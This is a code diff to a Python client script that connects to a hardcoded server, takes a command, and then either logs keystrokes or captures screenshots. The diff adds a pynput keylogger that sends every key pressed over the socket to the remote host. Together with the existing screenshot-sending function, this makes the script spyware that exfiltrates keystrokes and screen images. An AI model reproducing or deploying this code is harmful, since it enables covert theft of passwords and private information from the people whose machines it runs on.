@@ -1,3 +1,4 @@
+from  pynput.keyboard import Listener
 import socket
 import imutils
 import pyautogui
@@ -5,11 +6,22 @@ import cv2
 from datetime import datetime
 import os
 
-clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
 
 serverParrent = '192.168.1.22'
 serverPort = 12345
 clientSocket.connect((serverParrent, serverPort))
+messager = clientSocket.recv(1024).decode('utf-8')
+
+def on_press(key):
+    try:
+        key = str(key)
+        key = key.replace("'", "")
+        if key == "Key.f12":
+            raise SystemExit(0)
+        clientSocket.send(key.encode('utf-8'))
+    except Exception as e:
+        print("Error: " + str(e))
 
 def takeScreenshot():
     now = datetime.now()
@@ -31,5 +43,9 @@ def takeScreenshot():
                 break
             clientSocket.send(data)
 
-# Đóng kết nối
-clientSocket.close()
+     
+if messager == 'keylogger':
+    with  Listener(on_press =  on_press) as parent:         
+        parent.join()
+elif messager == 'screenshots':
+    print("Screenshots")
